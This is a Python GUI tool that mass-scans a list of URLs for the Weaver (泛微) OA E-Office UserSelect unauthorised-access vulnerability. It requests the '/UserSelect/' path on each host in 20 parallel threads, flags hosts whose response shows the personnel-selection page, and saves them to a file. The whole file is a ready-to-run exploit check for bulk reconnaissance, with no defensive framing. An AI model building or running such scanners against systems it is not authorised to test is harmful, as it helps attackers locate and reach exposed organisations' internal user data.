import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def FW_Eoffice(url):
    poc = r"""/UserSelect/"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "选择人员" in res.text:
            fw_Eoffice_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            fw_Eoffice_text.see(END)
            with open ("存在泛微OA-E-Office-UserSelect未授权访问漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            fw_Eoffice_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            fw_Eoffice_text.see(END)
    except Exception as err:
        fw_Eoffice_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        fw_Eoffice_text.see(END)
def get_fw_unauthorized_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def fw_unauthorized_gui():
    fw_unauthorized = tk.Tk()
    fw_unauthorized.geometry("910x450")
    fw_unauthorized.title("泛微OA E-Office UserSelect 未授权访问漏洞 一键检测")
    fw_unauthorized.resizable(0, 0)
    fw_unauthorized.iconbitmap('logo.ico')
    global fw_Eoffice_text
    fw_Eoffice_text = scrolledtext.ScrolledText(fw_unauthorized,width=123, height=25)
    fw_Eoffice_text.grid(row=0, column=0, padx=10, pady=10)
    fw_Eoffice_text.see(END)
    addrs = get_fw_unauthorized_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(FW_Eoffice, addr)
    fw_unauthorized.mainloop()